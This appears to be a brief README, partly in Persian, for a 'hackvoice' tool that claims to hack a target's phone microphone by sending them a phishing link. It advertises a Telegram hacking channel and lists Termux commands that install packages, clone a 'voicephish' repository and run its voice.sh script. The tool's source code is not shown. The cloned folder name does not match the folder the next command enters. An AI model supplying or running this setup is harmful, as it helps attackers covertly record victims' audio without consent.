# hackvoice
هک میکروفون گوشی با ارسال لینک - Hack microphone by sending link            
<a href="https://t.me/KillgerHack"><h2>T.ME/KILLGERHACK<h2></a>
کد های اجرا در ترموکس :
<pre><code>
<br>
apt update
<br>
apt upgrade 
<br>
pkg  install  wget  php  git openssl 
<br> 
git  clone https://github.com/KillgerHack/voicephish
<br>  
cd hackvoice  
<br>
bash voice.sh  
<br><code><pre>

